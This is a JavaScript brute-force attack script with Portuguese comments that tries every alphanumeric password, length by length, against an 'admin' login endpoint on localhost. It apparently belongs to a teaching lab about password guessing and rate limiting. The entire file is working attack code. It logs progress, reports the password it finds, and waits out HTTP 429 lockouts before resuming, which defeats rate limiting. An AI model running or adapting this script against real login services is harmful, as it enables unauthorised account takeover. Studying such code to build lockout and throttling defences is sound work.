const CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const USERNAME = "admin";
const SERVER_URL = "http://localhost:3000/login";
const LOG_EVERY = 200; 


function formatTime(ms) {
  if (ms < 1000) return `${ms}ms`;
  if (ms < 60000) return `${(ms / 1000).toFixed(2)}s`;
  const m = Math.floor(ms / 60000);
  const s = String(Math.floor((ms % 60000) / 1000)).padStart(2, "0");
  return `${m}m${s}s`;
}

// Pausa a execução por alguns milissegundos
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Gera a próxima senha em ordem lexicográfica.
// Retorna null quando todas as combinações daquele tamanho acabarem.
function nextPassword(current, charset) {
  const digits = current.split("").map((c) => charset.indexOf(c));
  let i = digits.length - 1;

  while (i >= 0) {
    if (digits[i] < charset.length - 1) {
      digits[i]++;
      return digits.map((d) => charset[d]).join("");
    }
    digits[i] = 0;
    i--;
  }

  return null; 
}

// Gera a primeira senha para um determinado tamanho
function firstPassword(length, charset) {
  return charset[0].repeat(length);
}

// Calcula quantas combinações existem para um dado comprimento
function totalForLength(length, charsetSize) {
  return charsetSize ** length;
}

// Faz uma tentativa de login no servidor com a senha informada
async function tryLogin(password) {
  const response = await fetch(SERVER_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      username: USERNAME,
      password
    })
  });

  const data = await response.json();
  return { response, data };
}

async function main() {
  console.log("   ATAQUE DE FORÇA BRUTA — EXAUSTIVO ORDENADO   ");
  console.log(`Usuário: ${USERNAME}`);
  console.log(`Charset: ${CHARSET.length} caracteres (A-Z a-z 0-9)`);
  console.log("Ordem:   1 dígito → 2 dígitos → 3 dígitos → …");
  console.log("-------------------------------------------------\n");

  const startTime = Date.now();
  let totalAttempts = 0;

  // Vai aumentando o tamanho da senha indefinidamente até encontrar a correta
  for (let length = 1; ; length++) {
    const total = totalForLength(length, CHARSET.length);

    console.log(`\n── Comprimento ${length} ──  ${total.toLocaleString("pt-BR")} combinações`);

    let password = firstPassword(length, CHARSET);

    // Testa todas as senhas desse comprimento
    while (password !== null) {
      totalAttempts++;

      try {
        const { response, data } = await tryLogin(password);
        const elapsed = Date.now() - startTime;
        const rate = Math.round(totalAttempts / (elapsed / 1000)) || 0;

        // Exibe progresso periodicamente, além de mostrar sempre sucesso ou bloqueio
        if (totalAttempts % LOG_EVERY === 0 || data.success || response.status === 429) {
          console.log(
            `[${String(totalAttempts).padStart(7)}]  "${password}"` +
            `  HTTP ${response.status}  ${formatTime(elapsed)}  ${rate} t/s`
          );
        }

        // Se acertou a senha, mostra estatísticas e encerra
        if (data.success) {
          const elapsed = Date.now() - startTime;
          const rate = Math.round(totalAttempts / (elapsed / 1000));

          console.log("\n------------------------------------------------");
          console.log(`  SENHA ENCONTRADA:  "${password}"`);
          console.log(`  Comprimento:       ${password.length} caractere${password.length !== 1 ? "s" : ""}`);
          console.log(`  Tentativas:        ${totalAttempts.toLocaleString("pt-BR")}`);
          console.log(`  Tempo total:       ${formatTime(elapsed)}`);
          console.log(`  Taxa média:        ${rate} tentativas/segundo`);
          console.log("-------------------------------------------------\n");
          return;
        }

        // Se o servidor bloqueou temporariamente, espera o tempo necessário
        // e tenta de novo após o desbloqueio
        if (response.status === 429) {
          const waitMs = (data.remainingBlockMs || 15000) + 500;
          console.log(`\n[BLOQUEIO] Aguardando ${Math.ceil(waitMs / 1000)}s para retomar...`);
          await sleep(waitMs);
          console.log("[RETOMANDO] Ataque reiniciado.\n");
          continue;
        }
      } catch (err) {
        console.error("\nErro de conexão:", err.message);
        console.error("Verifique se o servidor está rodando: npm start\n");
        return;
      }

      password = nextPassword(password, CHARSET);
    }

    console.log(`   Comprimento ${length} esgotado.`);
  }
}

main().catch(console.error);